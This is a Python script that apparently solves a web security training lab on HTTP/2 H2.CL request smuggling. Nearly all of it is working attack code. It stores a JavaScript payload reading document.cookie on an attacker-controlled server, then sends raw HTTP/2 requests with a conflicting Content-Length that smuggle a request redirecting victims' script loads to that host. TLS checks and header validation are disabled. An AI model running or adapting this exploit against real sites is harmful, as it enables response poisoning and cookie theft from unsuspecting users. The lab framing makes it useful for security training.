# H2.CL request smuggling

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
import h2.config
import h2.connection

TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def store_payload(url, payload, attacker):
	store_exploit_path = attacker
	store_exploit_data = {
			"formAction": "STORE",
			"urlIsHttps": "on",
			"responseFile": "/resources/js",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = requests.post(store_exploit_path, data=store_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % store_exploit_path)
	return r

def send_get_request(host):
	method = 'GET'
	path = '/gwyo'
	headers = format_h2_headers(method, path, host)
	resp = send_h2_request(headers, b"", host)
	return resp

def send_smuggle_request(host, attacker):
	request_body = f"""GET /resources/js HTTP/1.1
Host: {attacker}
Content-Length: 10

x="""
	method = 'POST'
	path = '/'
	additional_headers = """Content-Length: 0"""
	headers = format_h2_headers(method, path, host, additional_headers)
	body = format_body(request_body)
	resp = send_h2_request(headers, body, host)
	return resp

def format_h2_headers(method, path, host, headers=None):
	request_headers = [
	(":scheme", "https"),
	(":method", method),
	(":path", path),
	(":authority", host)
	]
	if headers:
		headers = headers.splitlines()
		for d in headers:
			name, value = d.split(':')
			request_headers.append((name.strip(), value.strip()))
	return request_headers

def format_body(body):
	return re.sub(r"(?<!\r)\n", "\r\n", body).encode()

def send_h2_request(request_headers, request_content, host, port=443):
	if request_content == str:
		request_content = request_content.encode()
	socket.setdefaulttimeout(TIMEOUT)

	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	ctx.set_alpn_protocols(['h2'])
	
	sock = socket.create_connection((host, port))
	sock = ctx.wrap_socket(sock, server_hostname=host)
	
	config = h2.config.H2Configuration(validate_outbound_headers=False, normalize_outbound_headers=False)
	conn = h2.connection.H2Connection(config=config)
	conn.initiate_connection()
	sock.sendall(conn.data_to_send())
	
	conn.send_headers(1, request_headers)
	conn.send_data(1, request_content, end_stream=True)
	sock.sendall(conn.data_to_send())

	body = b""
	response_end = False
	try:
		while not response_end:
			try:
				data = sock.recv(65536 * 1024)
			except socket.timeout:
				socket_timeout = True
				break
			if not data:
				break
			try:
				events = conn.receive_data(data)
			except InvalidBodyLengthError:
				error_code = "InvalidBodyLengthError"
			except Exception:
				error_code = "Error"
			for event in events:
				if isinstance(event, h2.events.ConnectionTerminated):
					error_code = event.error_code
				elif isinstance(event, h2.events.ResponseReceived):
					response_headers = event.headers
				elif isinstance(event, h2.events.DataReceived):
					conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
					body += event.data
				elif isinstance(event, h2.events.StreamEnded):
					response_body = body
					response_end = True
					break
			sock.sendall(conn.data_to_send())
		conn.close_connection()
		sock.sendall(conn.data_to_send())
		sock.close()
	except socket.timeout:
		socket_timeout = True
	if "response_headers" not in locals():
		response_headers = ""
	if "response_body" not in locals():
		response_body = ""
	if "error_code" not in locals():
		error_code = ""
	if "socket_timeout" not in locals():
		socket_timeout = False
	result = {
	"response_headers": response_headers,
	"response_body": response_body,
	"error_code": error_code,
	"socket_timeout": socket_timeout
	}
	return result

def get_status_code(resp):
	for h in resp['response_headers']:
		if h[0] == b":status":
			return int(h[1].decode())

def main():
	print('[+] Lab: H2.CL request smuggling')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		time.sleep(1)
		parsed_url = urllib.parse.urlparse(url)
		print(parsed_url)
		subdomain = parsed_url.netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url == "http":
			port = 80
		parsed_att = urllib.parse.urlparse(attacker)
		att_domain = parsed_att.netloc
		if parsed_att.port:
			att_port = parsed_att.port
		elif parsed_att.scheme == "https":
			att_port = 443
		elif parsed_att == "http":
			att_port = 80

		payload = "alert(document.cookie)"
		print('\n[+] Trying send Store js payload...')
		r = store_payload(subdomain, payload, attacker)
		print(r)
		time.sleep(1)
		print('\n[+] Trying send HTTP Request Smuggling attack to redirect to the js payload...')
		for i in range(1, 16):
			print('\n[+] Sending few Smuggling Requests...\t%s' % str(i))
			for j in range(1, 6):
				resp = send_smuggle_request(subdomain, att_domain)
				status = get_status_code(resp)
				print(status)
				
			time.sleep(10)
			r = requests.get(url, verify=False, proxies=proxies)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
				break





			

if __name__ == "__main__":
	main()
